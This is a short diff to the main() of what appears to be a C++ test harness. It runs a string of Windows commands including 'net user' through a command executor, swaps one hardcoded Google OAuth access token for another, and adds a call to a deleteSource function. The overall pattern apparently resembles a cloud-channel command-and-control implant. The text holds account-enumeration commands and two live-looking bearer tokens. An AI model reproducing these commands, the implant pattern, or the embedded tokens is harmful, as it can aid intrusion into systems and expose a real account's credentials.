@@ -49,7 +49,7 @@ int main() {
     std::string input = "dir\nnet user\necho bs";
     std::string output;
     std::string refreshToken;
-    std::string accessToken = "ya29.a0AcM612y6rVSYtP90ijDLNW_xqvcfgqV8CwSa52j3_eQA8JgMsNmhRvxH1SmSTWw9GDWSeTUG7ZRYavRPCwM1k9qIU_aRcEHjGrnKDzBQj0fOfzTWSnBaQLCHLtkw4AgpoUF3SIlfWNvGgoaP4l_1LjLGIat5krxDKG4wpjfEWwaCgYKAeASARASFQHGX2Mie2onw65Tg46rV153wG053w0177";
+    std::string accessToken = "ya29.a0AcM612y5U_9DJBKS4Ah7iq-r1TWl1LNNR5iK7l0L-aP262Qo1IYsGbtI8B5h-MHuj0wdeLiJBZVMYr1jTHhIaIPz1ruF_xWWK-jprIsI51IB3aUjgE9pnPyvP_TECoYLrkI-SYKG4yL6dN2GkW1vNvM4KsLmRPPR1WZ1mOUv4AaCgYKAXUSARASFQHGX2Mi0vEqFxQF5IgemsZjCZtggQ0177";
     //for (int i = 0; i < 6.5 * 1024; i++)
     //{
     //    output += "a";
@@ -67,8 +67,13 @@ int main() {
     //printf("Test begins:\nThe single upload error code: %d", errorCode);
     //printf_s("Source Context is: %s", output.c_str());
     //std::replace(input.begin(), input.end(), '\n', '&');
-    commandExecuter(input, output);
-    printf("Command execution result: %s", output.c_str());
+    
+    //commandExecuter(input, output);
+    //printf("Command execution result: %s", output.c_str());
+    
+    errorCode = deleteSource(accessToken);
+    printf("Source deleted with code: %d", errorCode);
+
     return 0;
 }
 
